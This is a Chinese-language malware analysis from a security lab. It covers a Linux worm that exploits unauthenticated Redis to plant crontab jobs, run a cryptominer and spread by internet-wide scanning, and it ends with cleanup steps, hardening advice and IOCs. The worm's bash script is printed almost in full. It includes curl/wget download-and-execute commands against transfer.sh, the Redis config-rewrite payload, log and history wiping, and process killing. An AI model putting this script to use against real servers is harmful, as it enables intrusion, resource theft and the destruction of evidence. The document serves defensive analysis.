# Linux Redis自动化挖矿感染蠕虫分析及安全建议

阅读量 **250355**

|评论 **1**

发布时间 : 2018-05-30 16:36:43

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t0130aa2e3cb8ebb10e.jpg)

#  一、 背景

自从Redis未授权问题获取Linux系统root权限的攻击方法的披露后，由于其易用性，利用该问题入侵Linux服务进行挖矿、扫描等的黑客行为一直层出不穷;而在众多利用该问题入侵服务器进行黑产行为的案例中，其中就存在一类利用该问题进行挖矿并且会利用pnscan自动扫描感染其他机器；该类攻击一直存在，不过在近期又呈现数量增加的趋势，在最近捕获到多次，我们针对其做下具体的分析。

#  二、 漏洞说明

首先针对利用的漏洞做个说明，Redis 默认情况下，会绑定在
0.0.0.0:6379，在没有利用防火墙进行屏蔽的情况下，将会将Redis服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下利用Redis的相关方法，可以成功将自己的公钥写入目标服务器的
~/.ssh 文件夹的authotrized_keys
文件中，进而可以直接登录目标服务器；如果Redis服务是以root权限启动，可以利用该问题直接获得服务器root权限。相关漏洞详情可以参考：

[https://www.seebug.org/vuldb/ssvid-89715](https://www.seebug.org/vuldb/ssvid-89715)

以下为漏洞利用演示（上传不了视频，播放地址：https://v.qq.com/x/page/u0661b9o772.html）：

经过在ZoomEye和SHODAN检索，可以发现分别众多Redis服务开放在公网上，这些服务都可能成为攻击目标。

#  三、 入侵分析

#

经过对捕获的事件进行分析，我们发现整个入侵流程大概是包含以下几个环节：  
1、扫描开放6379端口的Linux服务器（后续感染扫描网段为1.0.0.0/16到224.255.0.0/16）

2、通过redis-cli尝试连接Redis并执行预置在.dat文件里的利用命令将Redis的数据文件修改为/var/spool/cron/root，然后通过在Redis中插入数据，将下载执行脚本的动作写入crontab任务

3、通过脚本实现以上的相关行为，完成植入并启动挖矿程序

4、再编译安装pnscan，继续扫描感染下一个目标

#  四、 脚本分析

整个入侵利用以及后续的感染的实现，最主要的功能都是基于通过Redis问题写入crontab任务中下载执行的.cmd脚本（https://transfer.sh/MIpIA/tmp.9kIguIhkI7）来实现的，通过对它的分析，我们基本能够得到整个流程的所有细节，这是一个base脚本，我们通过解读来分析下它的相关功能。

1. sleep 1 

2. find . -maxdepth 1 -name “.mxff0” -type f -mmin +60 -delete 

3. [ -f .mxff0 ] && exit 0 

4. echo 0 > .mxff0 

这部分代码只要是用作重复执行的判断，将.mxff0文件作为标记文件，如果存在该文件则代表机器上已执行脚本，直接退出，否则写.mxff0文件并进行下一步动作；

5. trap “rm -rf .m* .cmd tmp.* .r .dat $0” EXIT 

设置预置动作，在脚本退出后删除相关文件和脚本自身；

6. setenforce 0 2>/dev/null 

7. echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null 

8. crontab -r 2>/dev/null 

9. rm -rf /var/spool/cron 2>/dev/null 

10\. grep -q 8.8.8.8 /etc/resolv.conf || echo “nameserver 8.8.8.8” >>
/etc/resolv.conf

11\. rm -rf /tmp/* 2>/dev/null

12\. rm -rf /var/tmp/* 2>/dev/null

13\. rm -rf /etc/root.sh 2>/dev/null

14\. sync && echo 3 > /proc/sys/vm/drop_caches

15\. cat <<EOF> /etc/security/limits.conf

16\. * hard nofile 100000

17\. * soft nofile 100000

18\. root hard nofile 100000

19\. root soft nofile 100000

20\. * hard nproc 100000

21\. * soft nproc 100000

22\. root hard nproc 100000

23\. root soft nproc 100000

24\. EOF

这部分主要是修改系统的配置，6、7行为关闭SELINU；

然后清空/var/spool/cron，进而判断系统DNS服务器是否存在8.8.8.8，没有则添加；

11-13则清空系统tmp目录和删除相关文件；

14行清空系统缓存，而15-24则是修改系统的资源限制；

25\. iptables -I INPUT 1 -p tcp –dport 6379 -j DROP

26\. iptables -I INPUT 1 -p tcp –dport 6379 -s 127.0.0.1 -j ACCEPT

27\. ps xf | grep -v grep | grep “redis-server|nicehash|linuxs|linuxl|crawler.weibo|243/44444|cryptonight|stratum|gpg-daemon|jobs.flu.cc|nmap|cranberry|start.sh|watch.sh|krun.sh|killTop.sh|cpuminer|/60009|ssh_deny.sh|clean.sh|./over|mrx1|redisscan|ebscan|redis-cli|barad_agent|.sr0|clay|udevs|.sshd|/tmp/init” | while read pid _; do kill
-9 “$pid”; done

这里再进一步的增加iptables限制6379端口只允许本地访问，同时kill相关包含挖矿、redis客户端、爬虫等进程，这里的目的也比较简单，避免被其他黑客再次入侵，同时清除可能其他黑客入侵启动的进程；

28\. rm -rf /tmp/* 2>/dev/null

29\. rm -rf /var/tmp/* 2>/dev/null

30\. echo 0 > /var/spool/mail/root

31\. echo 0 > /var/log/wtmp

32\. echo 0 > /var/log/secure

33\. echo 0 > /root/.bash_history

清除相关登录日志、命令操作历史；

34\. YUM_PACKAGE_NAME=”iptables gcc redis coreutils bash curl wget”

35\. DEB_PACKAGE_NAME=”coreutils bash build-essential make gcc redis-server
redis-tools redis iptables curl”

36\. if cat /etc/*release | grep -i CentOS; then

37\. yum clean all

38\. yum install -y -q epel-release

39\. yum install -y -q $YUM_PACKAGE_NAME

40\. elif cat /etc/*release | grep -qi Red; then

41\. yum clean all

42\. yum install -y -q epel-release

43\. yum install -y -q $YUM_PACKAGE_NAME

44\. elif cat /etc/*release | grep -qi Fedora; then

45\. yum clean all

46\. yum install -y -q epel-release

47\. yum install -y -q $YUM_PACKAGE_NAME

48\. elif cat /etc/*release | grep -qi Ubuntu; then

49\. export DEBIAN_FRONTEND=noninteractive

50\. rm -rf /var/lib/apt/lists/*

51\. apt-get update -q –fix-missing

52\. for PACKAGE in $DEB_PACKAGE_NAME;do apt-get install -y -q $PACKAGE; done

53\. elif cat /etc/*release | grep -qi Debian; then

54\. export DEBIAN_FRONTEND=noninteractive

55\. rm -rf /var/lib/apt/lists/*

56\. apt-get update –fix-missing

57\. for PACKAGE in $DEB_PACKAGE_NAME;do apt-get install -y -q $PACKAGE; done

58\. elif cat /etc/*release | grep -qi Mint; then

59\. export DEBIAN_FRONTEND=noninteractive

60\. rm -rf /var/lib/apt/lists/*

61\. apt-get update –fix-missing

62\. for PACKAGE in $DEB_PACKAGE_NAME;do apt-get install -y -q $PACKAGE; done

63\. elif cat /etc/*release | grep -qi Knoppix; then

64\. export DEBIAN_FRONTEND=noninteractive

65\. rm -rf /var/lib/apt/lists/*

66\. apt-get update –fix-missing

67\. for PACKAGE in $DEB_PACKAGE_NAME;do apt-get install -y -q $PACKAGE; done

68\. else

69\. exit 1

70\. fi

71\. sleep 1

72\. if ! ( [ -x /usr/local/bin/pnscan ] || [ -x /usr/bin/pnscan ] ); then

73\. curl -kLs https://codeload.github.com/ptrrkssn/pnscan/tar.gz/v1.12 >
.x112 || wget -q -O .x112
https://codeload.github.com/ptrrkssn/pnscan/tar.gz/v1.12

74\. sleep 1

75\. [ -f .x112 ] && tar xf .x112 && cd pnscan-1.12 && make lnx && make
install && cd .. && rm -rf pnscan-1.12 .x112

76\. fi

这一长串的内容主要目的是下载并编译安装pnscan，从内容中我们可以看到对于不同操作系统的判断然后安装依赖的相关模块，然后才是从github下载pnscan的源码进行编译安装；至于为什么采用编译安装的形式，猜测是出于兼容不同系统以及每次编译生成的pnscan的MD5都不一样，避免形成固定特征；

77\. tname=$( mktemp )

78\. OMURL=https://transfer.sh/MIpIA/tmp.vOYTgmtZge

79\. curl -s $OMURL > $tname || wget -q -O $tname $OMURL

80\. NMURL=$( curl -s –upload-file $tname https://transfer.sh )

81\. mv $tname .gpg && chmod +x .gpg && ./.gpg && rm -rf .gpg

这部分主要是下载挖矿程序并重命名为.gpg，增加执行权限，执行后删除，同时重新上传到<https://transfer.sh/> 获取新的链接；

82\. [ -z “$NMURL” ] && NMURL=$OMURL

83\. ncmd=$(basename $(mktemp))

84\. sed ‘s|'”$OMURL”‘|'”$NMURL”‘|g’ < .cmd > $ncmd

85\. NSURL=$( curl -s –upload-file $ncmd https://transfer.sh )

86\. echo ‘flushall’ > .dat

87\. echo ‘config set dir /var/spool/cron’ >> .dat

88\. echo ‘config set dbfilename root’ >> .dat

89\. echo ‘set Backup1 “tn*/2 * * * * curl -s ‘${NSURL}’ > .cmd && bash
.cmdnt”‘ >> .dat

90\. echo ‘set Backup2 “tn*/5 * * * * wget -O .cmd ‘${NSURL}’ && bash .cmdnt”‘
>> .dat

91\. echo ‘set Backup3 “tn*/10 * * * * lynx -source ‘${NSURL}’ > .cmd && bash
.cmdnt”‘ >> .dat

92\. echo ‘save’ >> .dat

93\. echo ‘config set dir /var/spool/cron/crontabs’ >> .dat

94\. echo ‘save’ >> .dat

95\. echo ‘exit’ >> .dat

而这部分内容主要是生成新的.dat文件，包含将原来.cmd脚本里的里挖矿程序的下载地址替换为上一步上传到<https://transfer.sh/>
得到的新地址，还有Redis利用的相关语句；

96\. pnx=pnscan

97\. [ -x /usr/local/bin/pnscan ] && pnx=/usr/local/bin/pnscan

98\. [ -x /usr/bin/pnscan ] && pnx=/usr/bin/pnscan

99\. for x in $( seq 1 224 | sort -R ); do

100. for y in $( seq 0 255 | sort -R ); do 

101. $pnx -t512 -R ‘6f 73 3a 4c 69 6e 75 78’ -W ‘2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a’ $x.$y.0.0/16 6379 > .r.$x.$y.o 

102. awk ‘/Linux/ {print $1, $3}’ .r.$x.$y.o > .r.$x.$y.l 

103. while read -r h p; do 

104. cat .dat | redis-cli -h $h -p $p –raw &

105. done < .r.$x.$y.l 

106. done 

107. done 

而步主要是调用pnscan去扫描子网段1.0.0.0/16到224.255.0.0/16中开放6379端口并且操作系统为Linux的目标，然后利用redis-cli执行.dat中的命令，进行下个目标的感染；这里pnscan的-W参数值‘2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d
0a’转换后内容‘*1rn$4rnINFOrn’，是向目标Redis服务发送请求获取Redis服务器的各种信息和统计数值，再通过-R参数值‘6f 73 3a
4c 69 6e 75 78′(转换后内容为os:Linux)判断是否Linux系统。

108. echo 0 > /var/spool/mail/root 2>/dev/null 

109. echo 0 > /var/log/wtmp 2>/dev/null 

110. echo 0 > /var/log/secure 2>/dev/null 

111. echo 0 > /root/.bash_history 2>/dev/null 

112. exit 0 

最后就是收尾工作，清除相关日志和命令执行历史，同时在脚本退出的时候会触发脚本一开始用trap预置的动作，会做删除操作，删除相关文件和脚本自身（rm -rf
m* .cmd tmp.* .r .dat $0）。

通过对脚本的解读，我们基本已经清楚整个蠕虫的行为和入侵流程，也就是我们开始所描述的流程。

另外，通过阅读脚本，我们发现虽然整个入侵流程并不是多复杂，但脚本其实有很多”工程化”的细节考虑，不得不让人惊叹入侵者的”考虑周到”：

1、 利用.mxff0文件做重复执行检验，避免脚本的重复执行

2、 为了增加成功性，一些环境的预处理：

a) 关闭SELINUX

b) 增加8.8.8.8的DNS

c) 清空tmp目录

d) 清空系统缓存

e) 修改系统资源限制

3、 痕迹清除

a) 利用trap预置动作好在脚本执行完成后删除相关文件和脚本自身

b) 重复清除相关登录等日志和命令执行历史

4、 同行预防

a) 利用iptables避免Redis服务开放在公网上从而导致再次被入侵

b) 清除同行可能遗留的入侵行为，kill相关进程

5、 系统兼容性

a) 判断操作系统，针对性的执行相关命令，安装依赖包，最大限度的提高pnscan编译安装的成功率

b) 关闭SELINUX，通过setenforce和修改/etc/sysconfig/selinux两种手段实现

c) 写入Crontab里的下载并执行脚本的任务，通过curl、wget、lynx三种方式实现

d) Pnscan扫描增加操作系统判断，减少没有必要的感染尝试

6、 特征去除，存活延续

a) Pnscan采用安装编译的方式，既提高在不同系统下的兼容性，也避免形成固定的MD5特征

b) 利用[https://transfer.sh](https://transfer.sh/) 中转，每一次感染均生成新的连接，避免固定链接形成固定特征

c) 下载到系统的相关文件均采用随机生成的文件名

正是由于入侵者种种的”考虑周到”使得他的入侵感染的成功率能够达到的一定的层度。

#  五、 安全建议

**病毒清理和系统恢复**

我们主要参考脚本的相关行为进行对应的行为恢复和删除即可：

1、 关闭SELINUX，根据系统原环境和业务需要重新开启SELINUX

2、 清空了/var/spool/cron，根据原先备份清空恢复

3、 修改/etc/resolv.conf增加DNS服务8.8.8.8，如无影响可不处理，或者删除

4、 修改了系统资源限制(/etc/security/limits.conf)，可根据备份情况恢复

5、 增加了对6379端口的Iptables规则，如果不影响业务，建议保留

6、 Kill了相关进程，检查是否包含业务所需进程，根据情况恢复

7、 安装了相关包，具体列表见上文，可根据情况删除或者如无影响可保留

8、 编译安装了pnscan，可删除/usr/local/bin/pnscan

9、 清除了相关日志和tmp目录，对系统无影响，可忽略

10、 启动了挖矿进程和pnscan扫描感染，进程：.gpg、pnscan，直接kill

还包含了一些中间文件，虽然脚本包含相关删除操作，但建议还是全局查找确认：.mxff0、.x112、.gpg、.dat、.cmd、.r.xx.xx.o/l、tmp.xxxx

**Redis** **服务加固**

1、
如无必要，修改bind项，不要将Redis绑定在0.0.0.0上，避免Redis服务开放在外网，可以通过iptables或者腾讯云用户可以通过安全组限制访问来源

2、 在不影响业务的情况，不要以root启动Redis服务，同时建议修改默认的6379端口，大部分针对Redis未授权问题的入侵都是针对默认端口进行的

3、 配置AUTH，增加密码校验，这样即使开放在公网上，如果非弱口令的情况，黑客也无法访问Redis服务进行相关操作

4、 使用rename-command CONFIG
“RENAME_CONFIG”重命名相关命令，这样黑客即使在连接上未授权问题的Redis服务，在不知道命令的情况下只能获取相关数据，而无法进一步利用

#  六、 附录

**IOCs**

1. 脚本 [https://transfer.sh/MIpIA/tmp.9kIguIhkI7](https://transfer.sh/MIpIA/tmp.9kIguIhkI7)

2. 挖矿程序 2918ee2b69bc4e6b581c7b25f08434fe

3. 矿池域名 [http://jb.chakpools.com/](http://jb.chakpools.com/)

4. 相关文件名 .mxff0、.x112、.gpg、.dat、.cmd、.r.xx.xx.o/l、tmp.xxxx

**链接**

1. 样本 https://www.virustotal.com/#/file/9756e66c168ec963c58b3d0ca5483927c14a64a99ba718fa9488a52d4d207ed6

2. Pnscan项目地址 https://github.com/ptrrkssn/pnscan

3. 漏洞说明 https://www.seebug.org/vuldb/ssvid-89715

4. 漏洞利用演示 https://v.qq.com/x/page/u0661b9o772.html

5、云镜产品官网 https://cloud.tencent.com/product/hs

作者：云鼎实验室 Fooying 2018/05/21

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **云鼎实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/146417](/post/id/146417)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [技术分析](/tag/技术分析)
  * [挖矿程序](/tag/挖矿程序)
  * [蠕虫攻击](/tag/蠕虫攻击)
  * [Redis](/tag/Redis)

 **+1** __1赞

 __收藏

![](https://p5.ssl.qhimg.com/t01b970aaa166cc3b7a.png) 云鼎实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

